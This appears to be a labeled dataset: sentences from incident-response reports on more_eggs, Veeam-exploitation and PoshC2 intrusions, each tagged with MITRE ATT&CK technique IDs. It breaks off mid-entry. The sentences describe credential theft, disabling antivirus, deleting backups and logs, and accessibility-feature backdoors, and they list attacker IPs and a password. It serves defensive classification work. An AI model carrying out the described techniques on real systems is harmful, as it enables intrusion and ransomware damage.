  {
    "type": "text",
    "text": "During this and later RDP pivoting activity, the threat actor leaked several host names that tie to other intrusions that ended with a Fog ransomware deployment, as reported by Arctic Wolf.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the backup server the threat actor deployed their Cobalt Strike payload and continued discovery activity with more SharpShares and Seatbelt activity and then AdFind.",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "At this time, on the backup server, LSASS memory was accessed for credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This service was created using a domain administrator account indicating the previous LSASS access was successful.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "On the backup server, the threat actor then used the browser to access the file sharing site temp.sh to download a zip file containing a Cloudflared installer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The MSI installer in the zip was then run and Cloudflared was installed as a service on the server.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "They then connected to the second server using RDP and repeated the install process there.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then started a new RDP session with the new user and then dropped and executed SoftPerfect Network Scanner.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After the scan, the threat actor opened a few files from a remote file share and then activity ceased for the day.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After this, they then removed the more_eggs files and persistence task on the beachhead and beaconing to more_eggs command and control ceased.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1070.004",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike and Cloudflared tunnels remained active but no further activity was observed before the threat actor was evicted.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Proofpoint has been tracking TA4557 since 2018 as a skilled, financially motivated threat actor known to distribute the exclusive more_eggs backdoor, which can profile the endpoint and send additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sending emails directly to employees containing instructions guiding the recipient to navigate to a resume-themed website that ultimately leads to malware delivery.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The actor used various methods to prevent security tools from recognizing the domain in the email body, seemingly to avoid automated analysis.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Examples include leaving a space or underscore before the TLD in the email body.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Sending benign emails directly to employees, waiting for a response, then replying with an email containing instructions guiding the recipient to navigate to a resume-themed website that ultimately leads to malware delivery masquerading as a fake candidate and applying to legitimate job postings on various employment websites.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The user downloaded John Shimkus.zip from the domain johnshimkus[.]com.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The site had a captcha when the Download CV button was clicked and regenerates a unique download URL when we attempted to analyze the site further.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Once the victim uncompressed the zip, they clicked the Windows Shortcut file John-_Shimkus.lnk which executed the infection flow.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "And then moves a legitimate copy of the binary, ie4uinit.exe, to a custom location while also setting some additional environment variables.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The flow uses a documented execution hijack of IE4uinit.exe (https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/).",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "By supplying a “side-loaded” .inf file to IE4uinit.exe, it can be used to load and execute COM scriptlets (SCT) from remote servers.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "In this case it was observed to reach out to the URL: hxxp://a92837f.johnshimkus[.]com/setthevar",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We can also use Prefetch to confirm that ie4uinit.exe interacted with the malicious ieuinit.inf.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after the execution of ie4uinit.exe, the DLL 20350.dll was dropped in the AppData folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The process wmiprvse.exe then spawned the following command:",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The chain then used schtasks to setup persistence for the more_eggs malware.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "During the initial more_eggs execution a scheduled task command was run:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The schtasks command was run with the /XML flag pointing to a text file dropped by the threat actor.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Can be combined with the /ru and /rp parameters, or with the /rp parameter by itself if the XML file already contains the user account information.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The command arguments in the task pointed to a file on disk 178F2E426.txt containing:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "On a backup server the threat actor downloaded a zip file named cloudflared.zip from the temp.sh file sharing site using Internet Explorer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We can see the internet explorer process write the file and extract the download url from the WebCacheV01.dat file for the user.",
    "command": "",
    "labels": [
      "T1005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then installed the tool Cloudflared through the MSI installer on two hosts in the environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "All of the users were added using net.exe but the commands were initiated via a variety of ways including local command shells, application exploits, and remote services.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor ran the following commands using their custom version of VeeamHax.exe to enable xp_cmdshell before creating a local administrator named sqlbackup with the password of Password!1221!:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "From the backup server we observed the net commands executed by the MSSQL process.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor removed files and artifacts from hosts throughout the intrusion.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "For example the more_eggs payload deleted its own DLL after execution.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, after the threat actor pivoted to a backup server we observed a log event for Windows Defender being disabled.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We observed no process event tied to this so we assess that this action was performed by the threat actor in the GUI with their RDP session.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell operational log with event ID 4103 and 4104 tracked the output of the script which highlighted they successfully extracted an Administrator password from the Veeam database.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The LSASS process on the backup server was accessed via the RunDll32 (Cobalt Strike) beacon using a well known Granted Access pattern of 0x1010 – PROCESS_QUERY_LIMITED_INFORMATION (0x1000) & PROCESS_VM_READ (0x0010)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The RunDll32 process was also observed interacting with other processes such as cmd.exe and RunDll32.exe, using SYSTEM, a compromised account domain administrator account and a newly created local account.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It appears that the threat actor had trouble executing the command and repeated the attempt again with an extra ‘cmd’ invocation.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Initial discovery actions started around 10 minutes after the initial execution of the malware.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "We suspect the threat actor was using the execute-assembly function of the Cobalt Strike beacon as there were several instances of rundll32.exe that had dotNet code injected into them.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Invoking SharpShares or SeatBelt (both .NET/managed applications) within an unmanaged code-based process (e.g., RunDLL32) results in the creation of a Common Language Runtime (CLR) usage log file as a side effect.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The presence of this file for a process such as RunDLL32.exe indicates that a .Net compiled payload has been executed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In this case we can correlate this activity to the execute-assembly event.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A network check was performed with route print followed by the creation of a scan archive:",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Within the zip content, we observed that there were other previous saved scans from at least five other victim environments.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "By reviewing the compromised user’s Shellbags, we were able to identify the threat actor rummaging through the file shares of the network",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After translating the CallerProcessID from hex to decimal we can correlate and confirm it as the Cobalt Strike process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After creating a local administrator account by exploiting CVE-2023-27532, the threat actor moved to a Veeam backup server via Remote Desktop Protocol.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Next, they pivoted again from the backup server to a second server in the environment using RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once on the backup server the threat actor ran Cobalt Strike on the host using rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "An additional threat actor workstation name, PACKERP-VUDV41R, was leaked in the authentication logs from the backup server.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After exploiting Veeam and gaining access to the backup server the threat actor obtained credentials for a domain administrator account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using this account they created a remote service on a management server and created a sqlbackup user with the same properties as the one they created on the backup server.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "And locally on the remote management server, 7045 events were created followed by process events to create the user account locally on the host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After performing these actions the threat actor again used RDP to access this host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The full beacon configuration was not recoverable however a partial configuration was picked up during a memory scan across the environment:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor transferred the file python-3.10.4-embed-amd64.zip through the Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This was dropped on the beachhead in the user writable ‘ProgramData’ folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The attacker attempted to extract the zip file contents via PowerShell commandlets, several combinations were attempted, this ultimately failed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor decided to use the Windows provided utility ‘Tar’ instead.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using the Tar utility, no target destination was specified by the threat actor.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As a result by default the extraction created >200 files in the Windows\\System32.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Unfortunately, the threat actor made a similar error, with files (> 200) extracted to the Windows\\SysWOW64 folder location this time.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They used 7za again to extract the contents (> 200 files) into the correct location.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A lot of file creation events were observed throughout this process (>700 files), with python files (.py extension) being created in Windows folder locations that could be unusual.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When analyzing the file cradle.py and decoding its content, we identified it was a Pyramid beacon with the following configuration.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Threat actor logged in from 217.138.202.116 as a local admin at 0858 UTC.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "First was the execution of a bat file called shadow.bat, which deletes shadow files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Registry run keys and two startup folders were then created for the primary ransomware file 1pgp.exe.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Even though the threat actor was running as a domain administrator they did not attempt to move laterally or spread their ransomware.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "These scripts execute various actions, including disabling antivirus processes and stopping services related to SQL, Hyper-V, security tools, and Exchange servers.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This report also highlights scripts responsible for erasing backups, wiping event logs, and managing the installation or removal of remote monitoring tools like Atera.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Our investigation uncovered the use of additional tools, including Ngrok for proxy services, SystemBC, and two well-known command and control frameworks: Sliver and PoshC2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Prior to the open directory appearing, this address had appeared in our threat intelligence feeds for PoshC2 command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Their toolkit featured scripts such as atera_del.bat and atera_del2.bat to remove Atera agents, backup.bat and delbackup.bat to delete system backups and shadow copies, and clearlog.bat to erase Windows event logs and associated data.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The actor employed cmd.cmd to disable User Account Control and modify registry settings, while scripts like def1.bat and defendermalwar.bat are used to disable Windows Defender, scheduled tasks, and uninstall Malwarebytes.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "They also utilized tools such as Ngrok for proxy purposes, Posh_v2_dropper_x64.exe for PowerShell-based command-and-control operations, and VmManagedSetup.exe, which contains SystemBC malware.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor further disrupted systems by stopping and disabling various critical services, using scripts like disable.bat and hyp.bat, and logging off user sessions with LOGOFALL.bat and LOGOFALL1.bat.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Further exploration using the HTTP HTML hash filter revealed a second IP address, 185.234.216.64:8000, with another open directory containing binaries closely matching those found at the first IP address.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The script also included instructions for downloading the .MSI version of the Atera Agent using the email ‘datilragna@gmail.com’.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Although the open directory at 94.198.53.143:8000, located in Russia, has been taken down, various security vendors, including the DFIR Report, continue flagging this IP for PoshC2 activity.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As of August 11, 2024, the second IP, 185.234.216.64:8000, remains accessible, indicating the threat actor’s continued use of this directory to host malicious batch scripts and binaries, leveraging PoshC2 and Sliver as their primary command-and-control tool kits.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "However, based on the tools presented we can conclude with medium confidence that these servers were used in ransomware intrusion activity–seeing many scripts looking to kill or stop services, delete backups and shadow copies, and disable or remove antivirus software.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The script also included instructions to download the .MSI version of the Atera Agent using curl and a login of ‘datilragna@gmail.com’, which appears to be a legitimate email address associated with an Atera Agent account.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During our analysis of the IP address hosting the open directory, 94.198.53.143, we found it associated with PoshC2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using external data sources like VirusTotal revealed several connections, including file communications, downloads, URLs, and notably, collections of Command and Control (C2) frameworks.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Scrolling down the list of open ports, we noticed the name “PoshC2” associated with port 443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon further investigation, we discovered another active PoshC2 open directory with nearly identical batch and executable files to those found on the initial PoshC2 IP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We retrieved files from this new open directory (185.234.216.64:8000) on two occasions: March 1, 2024, and June 29, 2024.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Notably, the latest retrieval contained more files than the first one.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The infrastructure’s use of different command and control frameworks is sporadic, but it is regularly reactivated, with the most recent activity occurring in August 2024.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The IP address 185.234.216.64 has been exclusively associated with PoshC2 activity.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script is used to delete all system state and general backups, remove all shadow copies, and ignore all boot failures.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This batch script to delete Windows event logs that also delete recycle bin and registry keys related to terminal server client.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This file disables UAC, modifies registry settings, including RDP settings.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script disables Windows Defender and scheduled tasks.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script disables Windows Defender, altering user account control settings and uninstalling Malwarebytes.",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script, which deletes all system state backups, backup catalogs, shadow copies, and alters boot configuration setting to ignore failures.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This batch script stops and disables services related to Microsoft SQL & Exchange, various database services, and additional system services on a Windows server/workstation.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script deletes various Hyper-V, SQL, and Firebird server services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "It also stops a wide range of system and third-party services in Windows machines.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script lists all user sessions, and logs off each session except the first one.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script attempts to log off all sessions up to the 20th session, excluding the user’s current session.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script contains a Ngrok authentication token that runs on port 3389 (RDP).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script that contains a Ngrok authentication token that runs in the same port, 3389 (RDP).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script to ensure that the network services are running and set to start automatically.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The PoshC2 dropper, a PowerShell-based C2 executable.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Linux version of Posh_v2_dropper_x64.exe.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The text file with PowerShell one-liners to execute PoshC2 agent and perform further post-exploitation actions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Bash shell script to execute a python dropper for PoshC2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script consists of multiple registry key deletions pertaining to security tools, including the creation of network shares for multiple disk drives while granting full access permissions to everyone.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "SystemBC malware executable.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Sliver C2 framework executable.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script is to remove services and processes associated with Hyper-V, multiple AV programs, SQL, and other specific services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Huge scripts to automate the disabling of processes, services, registry modification, and a lot of defense evasion techniques.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The sc command is also used, first to stop and then completely remove the AteraAgent service, all done silently without showing any output to the user with the help of “> nul 2> nul” commands.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The taskkill command is used to terminate a specific process, which in this case is the TicketingTray.exe.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "RMDIR command silently and recursively deletes the “TrayIconCaching” directory in the current user’s local temporary files.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The RMDIR command is used again to delete the installation folders of “ATERA Networks” from both the standard “Program Files” and “Program Files (x86)” directories.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "These commands are intended to prevent data recovery, delete the volume shadow copies, and configure system boot settings, all making it more difficult to restore.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Similar to the previous command, this one is for deleting regular backups (not just system state backups).",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This batch script checks if the user has administrative privileges and clears event logs in Windows.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The above commands are used to delete the Remote Desktop Protocol traces found on the host artifacts.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During our usual analysis, these are the artifacts that are commonly left by the threat actor for us to identify the RDP related activities as part of their lateral movement.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "These commands attempt to delete registry keys related to remote desktop settings under the current user’s profile, where the following options were used:",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "/va: Deletes all values associated with the key",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "/f: Forces the deletion, even if the key is protected",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Default.rdp typically stores the settings for the RDP connections..",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once visible, the command del Default.rdp will execute the deletion of the file as part of the threat actor’s deletion of RDP traces.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The script is meant to disable User Account Control (UAC), backdoor the Sticky Keys, Utilman, and other accessibility features with cmd.exe, and disable Network Level Authentication (NLA).",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Running this script would allow the threat actor to access the Windows sign-in screen without authentication and run commands using the backdoor accessibility tools in the system context.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The following batch script is another defense evasion script that provides several commands to disable Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The third section disables multiple scheduled tasks related to Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "This batch script executes several commands designed to disable various Windows Defender registry keys and alter User Account Control settings.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "WMIC command was also used in the last part of the script to uninstall Malwarebytes.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The last part of the commands contain wmic (Windows Management Instrumentation Commandline) to silently uninstall any products whose names contain ‘Malwarebytes’.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Just like the other script (backup.bat), it primarily focuses on removing backup and system restore points from a Windows system, disabling recovery options, and modifying the boot configuration to ignore failures.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "It uses command-line utilities like wbadmin, wmic, vssadmin, and bcdedit to delete existing backups, shadow copies, and system state backups, and then alters the system’s boot settings to prevent automatic recovery actions in case of errors.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Lines one through seven repeat the same actions observed in the prior discussed script.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The last part of the script automates the deletion of all shadow copies (backup snapshots) on a Windows system and then removes itself.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "First, it changes the directory to the one containing the script, then, creates and executes a command sequence through diskshadow, to delete the shadow copies; and finally, deletes the command file and the script itself, after pausing for user input.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This batch script contains 398 lines of code and can kill processes and disable multiple services including web servers, databases, and exchange services.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The script also deletes many AV services, including Trend Micro, ESET, and Kaspersky.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The script has more than 100 lines and starts with the following commands to delete Hyper-V services:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The script also deletes two services related to FireBird:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The rest of the script overlaps with the files we’ve previously analyzed in this report, disabling different database services and killing their processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The sessions are then logged off using the session IDs obtained, and the text file is deleted.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The presence of this binary in your environment can be a great indicator of compromise if you are not using it.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Aside from starting multiple services using net start command, below are the configuration changes using sc command",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The Posh_v2_dropper_x64.exe is, as its name states, a PoshC2 dropper.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Specifically, the sample is a C++ CLR (Common Language Runtime, a.k.a. .NET) loader which executes a PoshC2 PowerShell Dropper with the below reconstructed configuration.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The usage of the default kill date and TLS certificate (besides all other tools and “geographic” location) are common indications of the C2 being adversary instead of red team infrastructure.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At the time of writing, the Posh Command & Control service is still actively responding.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Hunting for additional PoshC2 infrastructure can be done through the default TLS certificate settings.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "native_dropper is the Linux version of Posh_v2_dropper_x64.exe, which is the Windows version of it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Performing a quick string reveals the configuration of this PoshC2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "While analyzing the files, the ones we observed on the second IP after pivoting with Shodan (185.234.216.64:8000), one additional thing that caught our attention was the poshc2+user.txt file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The download link mentioned on the below decoded commands is not accessible anymore.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first one is registry modification, which is used to enable Remote Desktop Protocol (RDP) on a Windows machine by setting the value of “fDenyTSConnections” to “0”.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The second command manipulates and configures the Windows Firewall to allow inbound RDP connections by opening TCP port 3389.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The provided commands utilize ‘curl’ to download the Atera Agent installation setup file, specifying the necessary Gmail and account ID.",
    "command": "",
    "labels": [
